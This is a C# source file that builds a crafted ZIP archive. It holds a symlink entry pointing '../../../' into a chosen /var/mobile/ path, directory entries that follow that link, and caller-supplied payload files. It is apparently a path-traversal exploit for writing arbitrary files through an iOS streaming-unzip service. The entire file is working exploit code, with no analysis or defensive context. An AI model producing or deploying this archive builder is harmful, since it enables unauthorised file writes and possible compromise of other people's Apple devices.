using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace AirCard.Core
{
    public static class StreamingZip
    {
        sealed class Entry { public string Name; public uint Mode; public byte[] Data; public uint Offset, Crc; }
        public static byte[] Build(string target, IList<byte[]> payloads, byte[] metadata = null)
        {
            if (!target.StartsWith("/var/mobile/", StringComparison.Ordinal) || target.Contains("..") || target.Contains("\\") || target.Contains("\0")) throw new ArgumentException("Invalid target directory.");
            string tail = target.TrimStart('/');
            var entries = new List<Entry>();
            Action<string, uint, byte[]> add = (name, mode, data) => entries.Add(new Entry { Name = name, Mode = mode, Data = data });
            add("META-INF/", 0x41ed, new byte[0]);
            add("META-INF/com.apple.ZipMetadata.plist", 0x8180, metadata ?? Plist.Write(Plist.Dict("Version", 2)));
            foreach (string dir in new[] { "p0/", "p0/p1/", "p0/p1/p2/" }) add(dir, 0x41ed, new byte[0]);
            add("p0/p1/p2/link", 0xa1ff, Encoding.UTF8.GetBytes("../../../" + tail));
            string cursor = "";
            foreach (string component in tail.Split('/')) { cursor += component + "/"; add(cursor, 0x41ed, new byte[0]); }
            for (int i = 0; i < payloads.Count; i++) add("payload_" + i, 0x8180, payloads[i]);
            using (var output = new MemoryStream())
            using (var w = new BinaryWriter(output, Encoding.UTF8, true))
            {
                foreach (var e in entries)
                {
                    e.Offset = checked((uint)output.Position); e.Crc = Crc32(e.Data); byte[] name = Encoding.UTF8.GetBytes(e.Name);
                    w.Write(0x04034b50u); w.Write((ushort)20); w.Write((ushort)0); w.Write((ushort)0); w.Write((ushort)0x2800); w.Write((ushort)0x5d30);
                    w.Write(e.Crc); w.Write((uint)e.Data.Length); w.Write((uint)e.Data.Length); w.Write((ushort)name.Length); w.Write((ushort)6); w.Write(name);
                    w.Write((ushort)0x5a53); w.Write((ushort)2); w.Write((ushort)e.Mode); w.Write(e.Data);
                }
                uint central = checked((uint)output.Position);
                foreach (var e in entries)
                {
                    byte[] name = Encoding.UTF8.GetBytes(e.Name);
                    w.Write(0x02014b50u); w.Write((ushort)0x0314); w.Write((ushort)20); w.Write((ushort)0); w.Write((ushort)0); w.Write((ushort)0x2800); w.Write((ushort)0x5d30);
                    w.Write(e.Crc); w.Write((uint)e.Data.Length); w.Write((uint)e.Data.Length); w.Write((ushort)name.Length); w.Write((ushort)6);
                    w.Write((ushort)0); w.Write((ushort)0); w.Write((ushort)0); w.Write(e.Mode << 16); w.Write(e.Offset); w.Write(name);
                    w.Write((ushort)0x5a53); w.Write((ushort)2); w.Write((ushort)e.Mode);
                }
                uint length = checked((uint)output.Position - central);
                w.Write(0x06054b50u); w.Write((ushort)0); w.Write((ushort)0); w.Write((ushort)entries.Count); w.Write((ushort)entries.Count);
                w.Write(length); w.Write(central); w.Write((ushort)0); w.Flush(); return output.ToArray();
            }
        }
        public static uint Crc32(byte[] bytes)
        {
            uint crc = 0xffffffff;
            foreach (byte b in bytes) { crc ^= b; for (int i = 0; i < 8; i++) crc = (crc >> 1) ^ ((crc & 1) != 0 ? 0xedb88320u : 0); }
            return ~crc;
        }
    }
}
